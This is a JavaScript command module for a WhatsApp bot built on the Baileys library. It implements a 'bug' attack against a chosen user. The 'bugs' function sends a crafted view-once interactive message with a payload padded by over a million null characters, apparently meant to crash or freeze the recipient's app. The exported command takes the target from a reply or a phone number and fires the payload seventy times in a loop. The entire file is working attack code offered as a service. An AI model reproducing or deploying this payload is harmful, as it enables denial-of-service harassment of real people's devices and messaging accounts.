import channelSender from '../commands/channelSender.js'

import pkg from "baileys";
const { proto } = pkg;

// Function to send beta1 message
async function bugs(message, client, participant){

    const target = participant

    await client.relayMessage(target, 

            {
                viewOnceMessage: {

                    message: {

                        interactiveResponseMessage: {

                            body: {

                                text: "Hi from dev senku",

                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {

                                name: 'galaxy_message'
                                ,
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvancechannelSender\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                
                                version: 3
                            }
                        }
                    }
                }
            }, 

            { participant: { jid: target } }
        );
    }


async function fuck(message, client){

 try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {

            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to channelSender.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the channelSender command

        for (let i = 0; i < 35; i++) {

            await bugs(message, client, participant);

            await bugs(message, client, participant);

            await new Promise(resolve => setTimeout(resolve, 1000));

        }

        await channelSender(message, client, "Succceded in sending channelSender to the target.\n\nThanks for using my service.", 4);

    } catch (error) {

        console.error("An error occurred while trying to channelSender the target:", error);

        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to channelSender the target: ${error.message}` });
    }
}

export default fuck;